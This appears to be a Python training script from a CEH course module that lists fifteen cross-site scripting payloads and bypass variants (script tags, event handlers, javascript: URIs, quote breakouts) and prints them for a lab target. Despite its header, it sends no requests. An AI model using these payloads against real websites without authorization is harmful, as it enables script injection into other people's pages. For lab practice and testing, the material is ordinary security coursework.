#!/usr/bin/env python3
# LAB-ONLY: Advanced XSS Tester (Stored + Reflected)
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests various XSS payloads and bypasses
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/xss.php?input="
# -----------------------------------------------------------------------------------

def generate_xss_payloads():
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "<select onfocus=alert('XSS')><option>1",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<a href='javascript:alert(1)'>Click</a>",
        "<iframe src='javascript:alert(1)'>",
        "<img src='javascript:alert(1)'>",
        "<svg><script>alert`xss`</script>",
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<scrscriptipt>alert(1)</scrscriptipt>"
    ]
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: Advanced XSS Tester")
    print("="*80)
    print("[*] Payloads to test (LAB ONLY):")
    for payload in generate_xss_payloads():
        print(f"   - {payload}")

if __name__ == "__main__":
    main()
